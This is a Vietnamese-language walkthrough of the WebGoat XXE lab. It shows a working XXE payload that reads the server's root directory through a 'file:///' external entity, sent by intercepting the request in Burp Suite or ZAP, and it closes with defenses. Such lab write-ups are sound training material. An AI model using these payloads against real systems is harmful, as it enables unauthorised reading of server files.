---
title: 1.05 | XXE
slug: XXE-05
description: Bài viết này sẽ hướng dẫn cách tấn công XXE trên WebGoat 2023.8
image: https://tiennhm.github.io/img/docs/database.jpg
sidebar_position: 1
# sidebar_class_name: hidden
tags: 
    - web-security
    - webgoat
    - security-misconfiguration
    - xxe
    - webgoat-2023.8
keywords: [web-security, webgoat, security-misconfiguration, xxe, webgoat-2023.8]
enableComments: true # for Gisqus comments, set to true
draft: false # set to true to hide this post from the site
---

> 🛠 **XXE Injection - Giải pháp hoàn chỉnh**  

## 🎯 **Mục tiêu bài tập**
- **Liệt kê thư mục gốc của hệ thống** bằng XXE Injection.
- **Phát hiện và bypass cơ chế kiểm tra đầu vào** của WebGoat.
- **Chặn và chỉnh sửa request HTTP** để thực hiện tấn công.


## 🔥 **1. Phân tích yêu cầu**
### **📌 Request ban đầu khi gửi comment bình thường**
```http
POST /WebGoat/xxe/simple
Content-Type: application/xml

<?xml version="1.0"?>
<comment>
  <text>This is my first comment, nice picture</text>
</comment>
```
👉 **Nhận xét:**  
- Request được gửi dưới dạng **XML**.
- Comment được hiển thị trên trang web sau khi gửi.
- **Chúng ta cần chỉnh sửa request này để thực hiện XXE Injection**.


## 🚀 **2. Thực hiện XXE Injection**
### **📌 Cách gửi payload XXE**
Chặn request bằng **Burp Suite/ZAP Proxy**, sau đó thay thế body như sau:

```http
POST /WebGoat/xxe/simple
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE user [<!ENTITY root SYSTEM "file:///"> ]>
<comment>
  <text>&root;</text>
</comment>
```
✅ **Giải thích:**  
- **`<!DOCTYPE user [...]>`**: Khai báo **DOCTYPE** để sử dụng entities.
- **`<!ENTITY root SYSTEM "file:///">`**: Đọc thư mục gốc của hệ thống.
- **`<text>&root;</text>`**: Chèn nội dung thư mục vào phản hồi.


## ❌ **3. Lỗi gặp phải và cách bypass**
Nếu dán trực tiếp payload vào ô nhập comment, ta nhận được lỗi:
```json
{
  "lessonCompleted" : false,
  "feedback" : "Sorry the solution is not correct, please try again.",
  "output" : "...javax.xml.stream.XMLStreamException: ParseError at [row,col]:[1,44]\\nMessage: The processing instruction target matching \\\"[xX][mM][lL]\\\" is not allowed.]"
}
```
👉 **Lý do:**  
- JavaScript trên trang web tự động **bọc nội dung input vào cặp `<text>...</text>`**.
- Điều này khiến **XML của chúng ta bị lỗi khi gửi đi**.


## 🛠 **4. Cách khắc phục**
✅ **Dùng Burp Suite hoặc ZAP để chặn và chỉnh sửa request**:  
1. **Bật Intercept Mode trong Burp/ZAP**.  
2. **Gửi một comment bình thường**.  
3. **Chỉnh sửa request trong Intercept và thay thế toàn bộ body bằng payload XXE**.  
4. **Gửi lại request và kiểm tra phản hồi**.


## 🎯 **5. Kiểm tra phản hồi**
- Nếu request thành công, server sẽ trả về danh sách thư mục gốc (`bin, etc, home...`).
- Nếu không, server có thể đã **vô hiệu hóa XXE**, cần thử cách khác.


## 🛡 **6. Cách phòng chống XXE**
- **Vô hiệu hóa DOCTYPE trong XML parser**.
- **Không cho phép đọc external entities (`SYSTEM "file:///"`)**.
- **Sử dụng JSON thay vì XML nếu có thể**.
- **Dùng WAF để phát hiện payload XXE**.
